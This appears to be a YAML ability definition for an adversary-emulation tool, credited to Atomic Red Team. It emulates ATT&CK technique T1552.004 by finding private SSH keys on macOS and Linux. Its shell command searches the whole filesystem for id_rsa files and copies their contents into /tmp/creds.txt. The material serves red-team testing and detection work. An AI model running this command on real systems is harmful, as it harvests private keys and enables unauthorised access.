- id: 46959285-906d-40fa-9437-5a439accd878
  name: Discover Private SSH Keys
  description: Discover private SSH keys on a FreeBSD, macOS or Linux system.
  tactic: credential-access
  technique:
    attack_id: T1552.004
    name: 'Unsecured Credentials: Private Keys'
  platforms:
    darwin:
      sh:
        command: find / -name "id_rsa" -type f -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt;
          cat "$1" >> /tmp/creds.txt' _ {} \; 2>/dev/null; exit 0
        cleanup: rm -f /tmp/creds.txt
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - credential-access
  - t1552.004
  - atomic-red-team
  author: Atomic Red Team
  additional_info:
    input_arguments:
      search_path:
        description: Path where to start searching from.
        type: path
        default: /
      filename:
        description: SSH Key file to search for
        type: string
        default: id_rsa
      optional_flags:
        description: optional flags passed into find that should be ran
        type: string
        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
          _ {} \;
